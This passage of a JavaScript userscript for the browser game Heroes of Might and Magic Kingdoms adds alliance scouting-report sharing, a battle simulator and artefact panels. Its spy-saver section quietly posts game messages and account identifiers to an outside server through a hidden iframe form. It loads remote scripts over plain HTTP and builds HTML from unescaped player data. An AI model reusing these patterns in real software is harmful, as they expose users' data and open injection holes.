			if(y == "y" || y == "")
				y = 0;
			HOMMK_user.ally.filter.x = x;
			HOMMK_user.ally.filter.y = y;
		}
		else{
			HOMMK_user.ally.filter[obj.name] = parseInt(obj.options[obj.selectedIndex].value);
		}
		refresh_search_list();
	};
	
				
	var refresh_search_list = HOMMK_user.ally.refresh_search_list = function(){
		var data = [],msg = HOMMK_user.ally.msg;
		for(var i=0;i<msg.length;i++){
			if(!HOMMK_user.ally.filter.alliance || HOMMK_user.ally.filter.alliance==msg[i].targetAlliance)
				if(!HOMMK_user.ally.filter.player || HOMMK_user.ally.filter.player==msg[i].targetId)
					if(!HOMMK_user.ally.filter.x || HOMMK_user.ally.filter.x==msg[i].x)
						if(!HOMMK_user.ally.filter.y || HOMMK_user.ally.filter.y==msg[i].y)
							data.push(msg[i]);
		}
		data = data.sort(function(a,b){return b.datetime - a.datetime;});
		var $table = $('<table id="hommk-gold-spy-table"></table>').css({width:'100%',border:'solid 1px gray'});
		var tmp = HOMMK_user.ally.list.alliance;
		var allianceSelect = [];
		for(var i in tmp){
			var selected = (HOMMK_user.ally.filter.alliance && HOMMK_user.ally.filter.alliance==(i.substring(1)) )?'selected=selected':'';
			allianceSelect.push("<option name='"+tmp[i]+"' "+selected+" value='"+i.substring(1)+"' >"+tmp[i]+"</option>");
		}
		allianceSelect = allianceSelect.sort(function(a,b){return a.toUpperCase()>b.toUpperCase()?1:-1;});
		allianceSelect = allianceSelect.join('');
		var tmp = HOMMK_user.ally.list.player;
		var playerSelect = [];
		for(var i in tmp){
			var selected = (HOMMK_user.ally.filter.player && HOMMK_user.ally.filter.player==(i.substring(1)) )?'selected=selected':'';
			playerSelect.push("<option name='"+tmp[i]+"' "+selected+" value='"+i.substring(1)+"' >"+tmp[i]+"</option>");
		}
		playerSelect = playerSelect.sort(function(a,b){return a.toUpperCase()>b.toUpperCase()?1:-1;});
		playerSelect = playerSelect.join('');
		$('<tr style="background-color:lightgray;text-align:center;font-weight:bold;color:black;"></tr>')
				.append(
					$('<td style="width:23%;"><select value="0" onchange="onchanger(this);" name="alliance" style="width:100%"><option>alliance</option><optgroup label="alliance list">'+allianceSelect+'</optgroup></select></td>')
				)
				.append(
					$('<td style="width:20%;"><select value="0" onchange="onchanger(this);" name="player" style="width:100%"><option>player</option><optgroup label="player list">'+playerSelect+'</optgroup></select></td>')
				)
				.append(
					$('<td style="width:28%;">position <input id="hommk-gold-ally-x" type=text size=2 maxlength=3 value='+(HOMMK_user.ally.filter.x?HOMMK_user.ally.filter.x:'x')+' /><input id="hommk-gold-ally-y" type=text size=2 maxlength=3 value='+(HOMMK_user.ally.filter.y?HOMMK_user.ally.filter.y:'y')+' /></td>')
				)
				.append(
					$('<td>date</td>')
				)
				.appendTo($table);
		function createReport(data){
			$('#tabs-2').empty().html('<div id="m_header" style="margin-bottom:10px;"></div><div id="m'+data.id+'" style="height:500px;overflow-y:auto;overflow-x:hidden;background-color:white;color:black;">loading...</div>');		
			$('<a href=#><= back</a>').button().appendTo($('#m_header')).click(function(){
				refresh_search_list();
				return false;
			});
			$('<a id="hommk-gold-jactari-alliance" href=#>jactari</a>').button().appendTo($('#m_header'));
			getScript("http://www.hommk.net/final/update/script_get_message.php?id="+data.id);
			return false;
		}
		function createRow(data){
				$('<tr></tr>')
				.append(
					$('<td>'+data.targetAllianceName+'</td>')
						.css({cursor:'pointer'})
						.click(function(){createReport(data);})
				)
				.append(
					$('<td>'+data.targetName+'</td>')
						.css({cursor:'pointer'})
						.click(function(){createReport(data);})
				)
				.append(
					$('<td>'+(data.city||'Halt')+' ('+data.x+','+data.y+')</td>')
						.css({cursor:'pointer'})
						//.click(function(){HOMMK.worldMap.center(data.x, data.y);})
						.click(function(){createReport(data);})
				)
				.append(
					$('<td>'+HOMMK.DateUtils.timestampToString(data.datetime,HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_DATE_STRING_SHORT)+' - '+HOMMK.DateUtils.timestampToString(data.datetime,HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_TIME_STRING)+'</td>')
					.css({cursor:'pointer'})
					.click(function(){createReport(data);})
				)
				.appendTo($table);
		}
		for(var i=0;i<data.length && i<50;i++){
			createRow(data[i]);
		}
		$('#tabs-2').empty().append($('<div style="max-height:400px;overflow:auto;"></div>').append($table));
		$table.find('td').css({borderBottom:'solid gray 2px'});
		$table.find('tr:nth-child(even)').css({backgroundColor:'#AF926E'});
		$("#hommk-gold-ally-x").focus(function(){
			if($(this).val() == "x" )
				$(this).val('');
		}).blur(function(){
			if($(this).val() == "" || $(this).val() == "0")
				$(this).val('x');
			onchanger({name:'coord_filter'});
		});
		$("#hommk-gold-ally-y").focus(function(){
			if($(this).val() == "y" )
				$(this).val('');
		}).blur(function(){
			if($(this).val() == "" || $(this).val() == "0")
				$(this).val('y');
			onchanger({name:'coord_filter'});
		});
	}
	
	
	$('#tabs').tabs({
	   show: function(event, ui) { 
			//$('#hommk-gold-password').focus();
			if(ui.index==1){
				HOMMK_user.ally.filter = {alliance:0,player:0,x:0,y:0};
				refresh_search_list();
			}
	   }
	});
	
	$('#hommk-gold-autosave-spy').attr('checked',autosave?'checked':'').change(function(){
		localStorage_setObject("HOMMK_ally_autosave", $(this).attr('checked') );
		if($(this).attr('checked')){
			var all = HOMMK.player.content.allianceId?"&alliance="+HOMMK.player.content.allianceId:"";
			getScript("http://hommk.net/final/update/script_save_message_start.php?world="+HOMMK.player.content.worldId+"&user="+HOMMK.player.content.userId+all);
		}
		else{
			if(HOMMK_user.ally.timer)
				clearInterval(HOMMK_user.ally.timer);
		}
	});
	if($('#hommk-gold-autosave-spy').attr('checked')){
		var all = HOMMK.player.content.allianceId?"&alliance="+HOMMK.player.content.allianceId:"";
		getScript("http://hommk.net/final/update/script_save_message_start.php?world="+HOMMK.player.content.worldId+"&user="+HOMMK.player.content.userId+all);
	}
	toobar_button('<img src="http://www.hommk.net/img/ally.png" /> '+localize("ALLIANCE_BUTTON"),function() {
		toggle_dialog( $dialog_alliance );
		return false;
	});
	
	HOMMK_user.ally.dialog = $dialog_alliance;
	
	
	if(HOMMK_user.ally.visible){
		toggle_dialog($dialog_alliance);
	}
		
})();
/* SPY SAVER */


(function(){


	var messages_id = "";
	var lastTime = 0, number = 0;
	
	function sendPost(content,html){
		var myIframeSender = document.createElement('iframe');
		myIframeSender.style.position="absolute";
			myIframeSender.style.top="1px";
			myIframeSender.style.left="-15px";
			myIframeSender.style.width="1px";
			myIframeSender.style.height="1px";
		document.body.appendChild(myIframeSender);
		myIframeSender.contentWindow.document.write("<form id='gg' action='http://www.hommk.net/final/update/save_message.php' method='post'>"
			+"<input type='hidden' name='user_id' value='"+HOMMK.player.content.userId+"' />"
			+"<input type='hidden' name='player_id' value='"+HOMMK.player.content.id+"' />"
			+"<input type='hidden' name='player_name' value='"+HOMMK.player.content.name+"' />"
			+"<input type='hidden' name='alliance_id' value='"+HOMMK.player.content.allianceId+"' />"
			+"<input type='hidden' name='world' value='"+HOMMK.player.content.worldId+"' />"
			+"<input type='hidden' name='html' value='"+html.replace(/'/g,"&#130;")+"'  />" //
			+"<input type='hidden' name='content' value='"+content.replace(/'/g,"&#130;")+"'  />"
			+"<input type=submit />"
			+"</form>"
			+"<script type='text/javascript'>document.forms[0].submit();</scr"+"ipt>");
	}
	function toBeSaved(msg){
		var id = msg.elementId; //msg.linked_messageId  
		if(	messages_id.indexOf(id)!=-1 )
			return false;
		if( msg.content.type != 'TROOP_SCOUTING')
			return false;
		return true;
	}
	function doSave(msg){
		messages_id += msg.elementId+'-';
		//linked_messageId||
		//console.log(msg);
		var x = (msg.content.contentJSON.siegedRegionX||msg.content.contentJSON.targetedHaltX)||0;
		var y = (msg.content.contentJSON.siegedRegionY||msg.content.contentJSON.targetedHaltY)||0;
		if(x==0 && msg.content.contentJSON.targetedRegionNumber){
			x = ((msg.content.contentJSON.targetedRegionNumber - 1) % HOMMK.worldMap.content._size)+1;
			y = parseInt((msg.content.contentJSON.targetedRegionNumber - 1) / HOMMK.worldMap.content._size)+1;
		}
		var city = msg.content.contentJSON.siegedRegionName || msg.content.contentJSON.cityName;
		HOMMK_user.ally.msg.push({
			id:msg.content.id,
			datetime:msg.content.creationDate,
			targetId:msg.content.contentJSON.targetedPlayerId,
			targetName:msg.content.contentJSON.targetedPlayerName,
			targetAlliance:msg.content.contentJSON.targetedPlayerAllianceId,
			targetAllianceName:msg.content.contentJSON.targetedPlayerAlliance,
			city:city,
			x:x,
			y:y
		});
		HOMMK_user.ally.list.alliance['a'+msg.content.contentJSON.targetedPlayerAllianceId] = msg.content.contentJSON.targetedPlayerAlliance;
		HOMMK_user.ally.list.player['p'+msg.content.contentJSON.targetedPlayerId] = msg.content.contentJSON.targetedPlayerName;
		
		var code = msg.mainElement.innerHTML;
		var html = code.replace(/ id="\w+"/g,''); // suppresion des ID 
		var $html = $("<div></div>").append($(html));
		$html.find('.scoutingResultHeader').each(function(){
			$(this).prev().remove();
			$(this).parent().prev().remove();
		});
		$html.find('.detailedMessageFooterSpace').each(function(){
			$(this).parent().remove();
		});
		$html.find('.hidden').each(function(){
			$(this).remove();
		});
		var ret = $html.html().replace(/&quot;/g,'');
		sendPost(JSON.stringify(msg.content),ret);
		var $alert = $('<div></div>').dialog({ 
			width:150,
			height:30,
			maxHeight:30,
			zIndex: 90000,
			resizable: false,
			title: "Message Saved.",
			hide:'slow'
		});
		setTimeout(function(){
			$alert.dialog('close');
		},1000);
	}
	function scan(){
		var messages = [];
		try{
			messages = HOMMK.elementPool.obj.MessageBoxFrame.obj[HOMMK.player.content.id].currentMessageList.messageBoxFrame.detailedMessageList.elementList;
		}
		catch(e){}
		for(var i=0;i<messages.length;i++){
			if(toBeSaved(messages[i])){
				doSave(messages[i]);
			}
		}
	}
	function message_checker(){
		var t=lastTime;
		var n=number;
		if(HOMMK.elementPool.obj.MessageBoxFrame && HOMMK.elementPool.obj.MessageBoxFrame.obj[HOMMK.player.content.id] && HOMMK.elementPool.obj.MessageBoxFrame.obj[HOMMK.player.content.id].currentMessageList){
			t=HOMMK.elementPool.obj.MessageBoxFrame.obj[HOMMK.player.content.id].currentMessageList.refreshRemoteTime;
			n=HOMMK.elementPool.obj.MessageBoxFrame.obj[HOMMK.player.content.id].currentMessageList.messageBoxFrame.detailedMessageList.elementList.length
		}
		
		if(t!=lastTime || n!=number){
			lastTime=t;
			number=n;
			setTimeout(scan,500);
		}
	} 
	HOMMK_user.ally.spy_save = function(){
		messages_id = "";
		HOMMK_user.ally.list = HOMMK_user.ally.list || {alliance:{},player:{}};
		if(HOMMK_user.ally && HOMMK_user.ally.timer)
			clearInterval(HOMMK_user.ally.timer);
		function spy_map(v){
			var data = v.split(','),obj={};
			obj.id = data[0];
			obj.datetime = data[1];
			obj.targetId = data[2];
			obj.targetName = data[3];
			obj.targetAlliance = data[4];
			obj.targetAllianceName = data[5];
			obj.city = data[6];
			obj.x = data[7];
			obj.y = data[8];
			//console.log(obj);
			messages_id += obj.id+"|";
			HOMMK_user.ally.list.alliance['a'+obj.targetAlliance] = obj.targetAllianceName;
			HOMMK_user.ally.list.player['p'+obj.targetId] = obj.targetName;
			return obj;
		}
		HOMMK_user.ally.msg = HOMMK_user.ally.data.split('|').slice(1).map(spy_map);
		var p = HOMMK_user.ally.list.player, l = [];
		for(var i in p){
			l.push({name:p[i],id:i,alliance:0});
		}
		HOMMK_user.ally.list.playerArray = l.sort(function(a,b){return a.name<b.name?-1:1;});
		HOMMK_user.ally.timer = setInterval(message_checker,1000);
	};
	
})();


(function(){
	var ennemy,myhero,bonus,$link,$prejactari;
	function disable_link(){
	
			$link.button({ disabled: true });
			$link.unbind('click');
			$link.click(function(){return false;});
	}
	function enable_link(){
	
			$link.button({ disabled: false });
			$link.unbind('click');
			$link.click(function(){

				var ennemyHeroId = parseInt($('#ennemyHeroId').find(':selected').val())-1;
				var ennemyArmiesId = parseInt($('#ennemyArmiesId').find(':selected').val())-1;
				var attacker = parseInt($('#attacker').find(':selected').val());
				if(ADMIN_DEBUG){
					//alert(ennemyArmiesId);
					//alert(ennemy.heroList[ennemyArmiesId]);
				}
				var ennemyHero = ennemy.heroList[ennemyHeroId];
				ennemyHero.attachedUnitStackList0 = (ennemyArmiesId==99)? ennemy.regionUnitStackList : ennemy.heroList[ennemyArmiesId].attachedUnitStackList;
				var newmyhero = {hero:myhero,bonus:bonus};
				
				if(attacker){
					if(ennemy.cityFortificationTagName)
						return capsule.permalien(null,newmyhero,ennemyHero,ennemy.cityFortificationTagName);
					return capsule.permalien(null,newmyhero,ennemyHero);
				}
				return capsule.permalien(null,ennemyHero,newmyhero);


			});
	}
	function checkHero(){
		var heroId = myhero.id;
		// inoccupied
		if(HOMMK.elementPool.obj.Hero.obj[heroId].content.heroBonuses){
			myhero = HOMMK.elementPool.obj.Hero.obj[heroId].content;
			var art = HOMMK.elementPool.obj.Hero.obj[heroId].content.heroBonuses.artefacts.local;
			var ski = HOMMK.elementPool.obj.Hero.obj[heroId].content.heroBonuses.skills.local;
			var spe = HOMMK.elementPool.obj.Hero.obj[heroId].content.heroBonuses.skills.local;
			bonus = {skills:ski,artefacts:art,spells:[]};
			return true;
		}
		// occupied but framed
		if(HOMMK.elementPool && HOMMK.elementPool.obj.HeroFrame){
			var hero = 0;
			var h = HOMMK.elementPool.obj.HeroFrame.values();
			for(var i=0;i<h.length && !hero;i++){
				if(h[i].isShowed && h[i].content.id==heroId){
					hero = h[i].content;
				}
			}
			if(hero){
				bonus = {skills:hero.heroSkillList,artefacts:hero.equipedArtefacts}; // spells:hero.spellBookSpellStackList
				myhero = hero;
				return true;
			}	
		}	
		// else do request
		do_request(
			{"elParamList":[{"elementType":"HeroFrame","elementId":heroId}]},
			function(json){
				var h = json.d['HeroFrame'+heroId];
				bonus = {skills:h.heroSkillList,artefacts:h.equipedArtefacts};
				if(myhero.id==heroId)// not change since
					enable_link();
			}
		);
		return false;
	}	
	function changeHero(){
		disable_link();
		var heroId = $(this).find(':selected').val();
		myhero = HOMMK.elementPool.obj.Hero.obj[heroId].content;
		if(checkHero())
			enable_link();
		return true;
	}
	function preload(){

		if($prejactari && $prejactari.length){
			//console.log('destruct_______');
			$prejactari.remove();
		}
		myhero = bonus = $link = null;
		
		
		
		var heroList = HOMMK.elementPool.obj.Hero.values();
		$prejactari = $('<div></div>')
			.dialog({
				title:'jactari',
				resizable:false,
				zIndex:90000			
			})
			.css({
				textAlign:'center'
			});

		var selectHero = "",h;
		myhero = heroList[0].content;
		var frame = HOMMK.elementPool.obj.HeroFrame;
		for(var i=0;i<heroList.length;i++){
			h = heroList[i].content;
			if(frame && frame.obj[h.id] && frame.obj[h.id].isShowed){
				myhero = h;
				selectHero += '<option selected="selected" value="'+h.id+'" >'+h.name+'</option>';
			}
			else{
				selectHero += '<option value="'+h.id+'" >'+h.name+'</option>';
			}
		}
		
		var ennemySelectHero = "<option>none</option>";
		for(var i=0;ennemy.heroList && i<ennemy.heroList.length;i++){
			if("<option>none</option>" == ennemySelectHero){
				ennemySelectHero = "";
			}
			h = ennemy.heroList[i];
			ennemySelectHero += '<option value="'+(i+1)+'" >'+h.name+'</option>';
		}
		
		//console.log(heroList.length,selectHero);
		//console.log('<select style="width:200px;"><option>choose a hero</option><optgroup label="hero list">'+selectHero+'</optgroup></select>');
		$('<div>You are :</div>')
			.appendTo($prejactari);
		$('<select id="attacker" style="width:200px;"><option value="1" >Attacker</option><option value="0" >Defenser</option></select>')
			.appendTo($prejactari);
		$('<div>Choose your hero :</div>')
			.appendTo($prejactari);
		$('<select style="width:200px;">'+selectHero+'</select>')
			.change(changeHero)
			.appendTo($prejactari);
		$('<div>Choose ennemy hero :</div>')
			.appendTo($prejactari);
		$('<select id="ennemyHeroId" style="width:200px;">'+ennemySelectHero+'</select>')
			.appendTo($prejactari);		
		$('<div>Take ennemy armies from :</div>')
			.appendTo($prejactari);
		if(ennemy.cityName)
			ennemySelectHero = '<option value="100" >[city] '+ennemy.cityName+'</option><optgroup label="from heroes">' + ennemySelectHero + '</optgroup>';
		$('<select id="ennemyArmiesId" style="width:200px;">'+ennemySelectHero+'</select>')
			.appendTo($prejactari);
		$('<br/><br/>')
			.appendTo($prejactari);
		$link = $('<a href=# id="hommk-gold-alliance-jactari-start" target="_blank">Simulate fight</a>')
			.button({ disabled: true })
			.appendTo($prejactari);
			
		//$('<br/>').appendTo($prejactari);
		//console.log(ennemy);
		
		if(checkHero())
			enable_link();
		
			/*
			.click(function(){
				if(checkHero())
					alert('ok');
				else
					alert("sorry, your hero is busy, we don't have acces to artefacts and skills informations, please open hero's informations window and click again on the simulate button.");
			});*/

		//console.log(ennemy);
		

		//HOMMK_user.ally.defender = ennemy;
		//console.log('jactari init');

	}
	// EXPORT
	HOMMK_user.jactari_gold = function(json){

		//console.log('jactari data',json);
		ennemy = json.contentJSON;
		$('#hommk-gold-jactari-alliance').click(preload);
	}
})();
(function(){
	console.log(HOMMK.elementPool);		

	function tooltipMove(e){
		var y = e.clientY + $('body').scrollTop()-15;
		var x = e.screenX + $('body').scrollLeft()+10;
		$tooltip.css({left:x+'px',top:y+'px'});
	}
	
	var worldId = HOMMK.player.content.worldId;
	var userId = HOMMK.player.content.userId;
	var refreshableHero = localStorage_getObject('refreshableHero_'+worldId+'_'+userId,{});
	var refreshableMarket = localStorage_getObject('refreshableMarket_'+worldId+'_'+userId,{});
	var refreshableSkills = localStorage_getObject('refreshableSkills_'+worldId+'_'+userId,{});
	
	var hList,cList,
	heroTotalCount,heroCurrentCount,
	skillTotalCount,skillCurrentCount,
	marketTotalCount,marketCurrentCount;

	function checkEnd(){
		if(heroTotalCount<=heroCurrentCount && skillTotalCount<=skillCurrentCount && marketTotalCount<=marketCurrentCount){
			localStorage_setObject('refreshableHero_'+worldId+'_'+userId,refreshableHero);
			localStorage_setObject('refreshableMarket_'+worldId+'_'+userId,refreshableMarket);
			localStorage_setObject('refreshableSkills_'+worldId+'_'+userId,refreshableSkills);
			buildArtefacts();
		}
	}
	function updateCounter(){
		$('#loadingCount').text(Math.floor((heroCurrentCount+marketCurrentCount+skillCurrentCount)*100/(heroTotalCount+marketTotalCount+skillTotalCount)));
	}
	function createRequest(type,id){
		var request,callback;
		if(type == 'hero'){
			request = {"elParamList":[{"elementType":"HeroFrame","elementId":id}]};
			callback = function(json){
				if(json.d['HeroFrame'+id]){
					refreshableHero[type+id] = json.d['HeroFrame'+id];
				}
				$('#heroCount').text(Math.floor((++heroCurrentCount)*100/(heroTotalCount)));
				updateCounter()
				checkEnd();
			};
		}
		if(type == 'market'){
			request = {"elParamList":[{"elementType":"MarketPlaceFrame","elementId":id}]};
			callback = function(json){
				if(json.d['MarketPlaceFrame'+id]){
					refreshableMarket[type+id] = json.d['MarketPlaceFrame'+id];
				}
				$('#marketCount').text(Math.floor((++marketCurrentCount)*100/(marketTotalCount)));
				updateCounter()
				checkEnd();
			};
		}
		if(type == 'skill'){
			request = {"elParamList":[{"elementType":"MagicGuildFrame","elementId":id}]};
			callback = function(json){
				if(json.d['MagicGuildFrame'+id]){
					refreshableSkills[type+id] = json.d['MagicGuildFrame'+id];
				}
				$('#skillCount').text(Math.floor((++skillCurrentCount)*100/(skillTotalCount)));
				updateCounter()
				checkEnd();
			};
		}
		do_request(	request,callback);
	}
	function refresh(){
		hList = HOMMK.elementPool.obj.Hero.values();
		cList = HOMMK.elementPool.obj.RegionCity.values();
		totalCount = 3 * cList + hList;
		currentCount = 0;
		$('<div>Heroes : <span id="heroCount">0</span>%'
	//	+'<br/>Cities : <span id="cityCount">0</span>/'+cList.length
		+'<br/>Artefacts : <span id="marketCount">0</span>%'
		+'<br/>Skills : <span id="skillCount">0</span>%'
		+'<hr/><br/><b>Total : <span id="loadingCount">0</span>%</div>')
		.dialog({
			modal: true,
			title: "Loading data..",
			zIndex: 99999,
			resizable: false,
			draggable:false,	
			buttons: {
				close: function() {
					$( this ).dialog( "close" );
				}
			}
		});
		heroTotalCount=hList.length;
		heroCurrentCount=0;
		for(var i=0;i<hList.length;i++){
			createRequest('hero',hList[i].content.id);
		}
		marketTotalCount=cList.length;
		marketCurrentCount=0;
		for(var i=0;i<cList.length;i++){
			createRequest('market',cList[i].content.id);
		}
		skillTotalCount=cList.length;
		skillCurrentCount=0;
		for(var i=0;i<cList.length;i++){
			createRequest('skill',cList[i].content.id);
		}
		return false;
	}
	
	var $panel = $('<div></div>')
		.dialog({
			autoOpen:false,
			title: localize("DATA_BUTTON"),
			zIndex: 90000,
			resizable: false,
			width: 900,
			position:['center',30]
		});
		
	
	var $tabs = $('<div id="data-tabs"><ul>'
		+'<li><a href="#data-tabs-1" id="tabs-tabs-1">'+localize("RESSOURCES_DATA")+'</a></li>' //<span class="ui-icon ui-icon-close">Remove Tab</span>
		+'<li><a href="#data-tabs-3" id="tabs-tabs-3">'+localize("RESSOURCES_TROOP")+'</a></li>' //<span class="ui-icon ui-icon-close">Remove Tab</span>
		+'<li><a href="#data-tabs-2" id="tabs-tabs-2">'+localize("RESSOURCES_SPELL")+'</a></li>' //<span class="ui-icon ui-icon-close">Remove Tab</span>
		+'<li><a href="#data-tabs-4" id="tabs-tabs-4">'+localize("RESSOURCES_ARTEF")+'</a></li>' //<span class="ui-icon ui-icon-close">Remove Tab</span>
		+'<li><a href="#data-tabs-5" id="tabs-tabs-5">'+localize("RESSOURCES_ACTIONS")+'</a></li>' //<span class="ui-icon ui-icon-close">Remove Tab</span>
		+'<li><a href="#data-tabs-6" id="tabs-tabs-6">'+localize("RESSOURCES_FORTR")+'</a></li>' //<span class="ui-icon ui-icon-close">Remove Tab</span>
		+'</ul>'
		+'<div id="data-tabs-1"><p>in build.</p></div>'
		+'<div id="data-tabs-3"><p>armies</p></div>'
		+'<div id="data-tabs-2"><p>spells.</p></div>'
		+'<div id="data-tabs-4">artefacts.</div>'
		+'<div id="data-tabs-5"><p>Actions.</p></div>'
		+'<div id="data-tabs-6"><p>Fortress.</p></div>'
		+'</div>')
	.css({
		//"background-color":"black"
	})
	.appendTo($panel);
	
	var imgSprites = [
		[440,-20,-95,HOMMK.IMG_URL+'css_sprite/SideBar_Shortcuts.png'],
		[440,-360,0,HOMMK.IMG_URL+'css_sprite/SideBar_Shortcuts.png'],
		[440,-20,0,HOMMK.IMG_URL+'css_sprite/SideBar_Shortcuts.png'],
		[440,-40,-95,HOMMK.IMG_URL+'css_sprite/SideBar_Shortcuts.png'],
		[440,-300,0,HOMMK.IMG_URL+'css_sprite/SideBar_Shortcuts.png'],
		[440,-60,-95,HOMMK.IMG_URL+'css_sprite/SideBar_Shortcuts.png']
	];
	var src,img,style;
	for(var i=1;i<=6;i++){
		src = imgSprites[i-1][3];
		style = "position:relative;width:" + imgSprites[i-1][0] + "px;left:" + imgSprites[i-1][1] + "px;top:" + imgSprites[i-1][2] + "px;";
		img = $('<div><img src="'+src+'" style="'+style+'" /></div>')
			.css({
				overflow:"hidden",
				width:"20px",
				height:"20px",
				float:"left",
				"margin-right":"15px"
			})
			.prependTo($('#tabs-tabs-'+i));
	}
	
		
	$tabs.tabs({
		tabTemplate: "<li><a href='#{href}'><img src='{}' class='icone' /> #{label}</a></li>", // <span class='ui-icon ui-icon-close'>Remove Tab</span>
		add: function( event, ui ) {
			var tab_content = $tab_content_input.val() || "Tab " + tab_counter + " content.";
			$( ui.panel ).append( "<p>" + tab_content + "</p>" );
		}
	});
	
	
	
		function buildArtefacts(){
		var heroesList = {}, citiesList = {}, bodiespartList = {};
		var e;
		var artefacts =	'<input type="button" id="REFRESHABLE" value="refresh" />'
				+'<select id="ARTEFACT_MAIN_SELECTOR">'
						+'<option value="all">Anywhere</option>'
						+'<option value="all_hero">Only on hero</option>'
						+'<option value="all_city">Only in city</option>'
						+'<optgroup label="Heroes">'
					+'</optgroup>'
						+'<optgroup label="Cities">'
					+'</optgroup>'
				/*	+'<optgroup label="Bodies part">'
						+'<option>Only in bag</option>'
					+'</optgroup>'*/
				+'</select>'
				+'<select>'
					+'<option>All</option>'
					+'<optgroup label="Effects">'
					+'</optgroup>'
				+'</select>'
			+'<input type="button" id="EXPORTABLE" value="export" />'
			+'<table id="artefacts" border="1">'
			+'<tr><th width="18%">'+localize("TEXT_NAME")+'</th><th>'+localize("TEXT_EFFECTS")+'</th><th width="12%">'+localize("TEXT_TYPE")+'</th><th width="18%">'+localize("TEXT_OWNER")+'</th></tr>';
		
	//	console.log(refreshableHero);
		var colorPal = ['blue','red','green','orange','gray','purple'],c=0;
		for(var i in refreshableHero){
			h = refreshableHero[i];
			if(h.equipedArtefacts){
				aList = h.equipedArtefacts;
				if(aList.length>0)
					heroesList['h'+h.id] = {name:h.name,len:aList.length};
				for(var i=0;i<aList.length;i++){
					t = aList[i].artefactEntity;
					bodiespartList['b'+t.bodyPart] = {name:t.bodyPartLoc};
					artefacts += "<tr class='ARTEFACTS_ ARTEFACTS_HERO_"+h.id+" ARTEFACTS_"+t.bodyPart+"'>";
					artefacts += "<td>" + t.name + "</td>";
					artefacts += "<td>";
					var j=1;
					while(e=t['effect'+j++]){
						c %= colorPal.length;
						artefacts += "<span style='color:" + colorPal[c++] + ";'>" + e.desc + ". </span> ";
					}
					artefacts += "</td>";
					artefacts += "<td>" + t.bodyPartLoc + "</td>";
					artefacts += "<td>" + h.name + "<br/><span class='discret'>equiped</span></td>";
					artefacts += "</tr>";
				}
			}			
			if(h.backpackArtefacts){
				aList = h.backpackArtefacts;
				len = heroesList['h'+h.id]?heroesList['h'+h.id].len:0;
				if(aList.length>0)
					heroesList['h'+h.id] = {name:h.name,len:aList.length+len};
				for(var i=0;i<aList.length;i++){
					t = aList[i].artefactEntity;
					artefacts += "<tr class='ARTEFACTS_ ARTEFACTS_HERO_"+h.id+" ARTEFACTS_BAG'>";
					artefacts += "<td>" + t.name + "</td>";
					artefacts += "<td>";
					var j=1;
					while(e=t['effect'+j++]){
						c %= colorPal.length;
						artefacts += "<span style='color:" + colorPal[c++] + ";'>" + e.desc + ". </span> ";
					}
					artefacts += "</td>";
					artefacts += "<td>" + t.bodyPartLoc + "</td>";
					artefacts += "<td>" + h.name + "<br/></td>";
					artefacts += "</tr>";
				}
			}
			
			
		}	
	//	console.log(refreshableMarket);	
		for(var i in refreshableMarket){
			h = refreshableMarket[i];
			var cityId = i.substring(6);
			if(!HOMMK.elementPool.obj.RegionCity.obj[cityId]){
				throw "ERROR ARTEFACTS : CITY("+cityId+") NOT FOUND.";
				return 0;
			}
			var cityName = HOMMK.elementPool.obj.RegionCity.obj[cityId].content.cityName;
			if(h.cityArtefactList){
				aList = h.cityArtefactList;
				if(aList.length>0)
					citiesList['c'+cityId] = {name:cityName,len:aList.length};
				for(var i=0;i<aList.length;i++){
					t = aList[i].artefactEntity;
					artefacts += "<tr class='ARTEFACTS_ ARTEFACTS_REGION_"+cityId+"'>";
					artefacts += "<td>" + t.name + "</td>";
					artefacts += "<td>";
					var j=1;
					while(e=t['effect'+j++]){
						c %= colorPal.length;
						artefacts += "<span style='color:" + colorPal[c++] + ";'>" + e.desc + ". </span> ";
					}
					artefacts += "</td>";
					artefacts += "<td>" + t.bodyPartLoc + "</td>";
					artefacts += "<td>" + cityName + "<br/></td>";
					artefacts += "</tr>";
				}
			}
		}
		artefacts += '</table>';
		$('#data-tabs-4').html(artefacts);
		$('#data-tabs div table').css({
			color:'black',
			backgroundColor:'white',
			width:'100%',
		});
		$('.discret').css({	color:'gray',"font-weight":'lighter'});
		$('#REFRESHABLE').click(refresh);
		$('#EXPORTABLE').click(function(){alert('not yet available');});
		function artefact_changer(){
			var v = $(this).find(':selected').val();
			if(v == "all"){
				$('.ARTEFACTS_').show();
				return 1;
			}
			if(v == "all_hero"){
				$('.ARTEFACTS_').show();
				$('tr[class*="ARTEFACTS_REGION_"]').hide();
				return 1;
			}
			if(v == "all_city"){
				$('.ARTEFACTS_').hide();
				$('tr[class*="ARTEFACTS_REGION_"]').show();
				return 1;
			}
			if(v.substring(0,5) == "hero_"){
				$('.ARTEFACTS_').hide();
				$('.ARTEFACTS_HERO_'+v.substring(5)).show();
				return 1;
			}
			if(v.substring(0,5) == "city_"){
				$('.ARTEFACTS_').hide();
				$('.ARTEFACTS_REGION_'+v.substring(5)).show();
				return 1;
			}
		}
		
		$('#ARTEFACT_MAIN_SELECTOR').change(artefact_changer);
		for(var i in heroesList){
			name = heroesList[i].name;
			len = heroesList[i].len;
			id = i.substring(1);
			$('optgroup[label="Heroes"]')
				.append($('<option value="hero_'+id+'">'+name+'('+len+')</option>'));
		}
		for(var i in citiesList){
			name = citiesList[i].name;
			len = citiesList[i].len;
			id = i.substring(1);
			$('optgroup[label="Cities"]')
				.append($('<option value="city_'+id+'">'+name+'('+len+')</option>'));
		}
		/*for(var i in bodiespartList){
			name = bodiespartList[i].name;
			len = bodiespartList[i].len;
			id = i.substring(1);
			$('optgroup[label="Bodies part"]')
				.append($('<option value="'+id+'">'+name+'</option>'));
		}*/
	}	function buildRessources(){
		// TOOLTIP
		var $tooltip = $('<div id="Tooltip" class="tooltip" >'+HOMMK.elementModelPool.obj.ResourceStackTooltip+'</div>')
		.css({
			zIndex:99999999,
			position:'absolute',
			top:'50px',
			left:'50px'
		})
		.hide()
		.appendTo($(document.body));
		
		
		
		function tooltipDisplay(	e){
			var c = $(this).children('.hiddenTooltip').clone().show();
			$tooltip.empty().append(c).show();
		}
		
		var $table = $('<table style="width:100%;background-color:white;color:black;" id="data_troops" border="1"></table>').appendTo($('#data-tabs-1').empty());
		
		// HTML
		var cities = HOMMK.elementPool.obj.RegionCity.values().sort(function(a,b){return a.content.captureDate - b.content.captureDate;}),c;
		for(i=0;i<cities.length;i++){
			(function(city){
				var res, $content;
				var c = city.content;
